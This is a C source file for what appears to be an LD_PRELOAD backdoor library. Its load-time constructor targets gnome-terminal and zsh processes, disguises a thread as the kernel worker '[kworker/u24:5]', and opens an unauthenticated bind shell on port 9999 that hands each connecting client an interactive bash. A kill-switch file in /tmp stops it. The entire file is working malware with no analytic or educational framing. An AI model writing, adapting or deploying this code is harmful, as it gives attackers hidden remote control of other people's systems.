#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/prctl.h>

#define BIND_PORT 9999
#define KILL_SWITCH "/tmp/.ghost_off"

int is_target_process() {
    char comm[16];
    int fd = open("/proc/self/comm", O_RDONLY);
    if (fd < 0) return 0;
    int len = read(fd, comm, sizeof(comm) - 1);
    close(fd);
    if (len <= 0) return 0;
    comm[len] = '\0';
    
    return (strstr(comm, "gnome-terminal") != NULL || strstr(comm, "zsh") != NULL);
}

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;
    socklen_t addrlen = sizeof(addr);
    prctl(PR_SET_NAME, "[kworker/u24:5]", 0, 0, 0);
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return NULL;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(BIND_PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(server_fd);
        return NULL;
    }
    listen(server_fd, 3);

    while (access(KILL_SWITCH, F_OK) != 0) {
        struct timeval tv = {2, 0}; 
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        if (select(server_fd + 1, &fds, NULL, NULL, &tv) > 0) {
            if ((client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen)) >= 0) {
                if (fork() == 0) {
                    close(server_fd);
                    dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                    unsetenv("LD_PRELOAD"); 
                    execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                    exit(0);
                }
                close(client_fd);
            }
        }
    }
    close(server_fd);
    return NULL;
}

__attribute__((constructor))
void init_ghost() {
    if (!is_target_process()) return;
    

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, ghost_listener, NULL);
    pthread_attr_destroy(&attr);
}
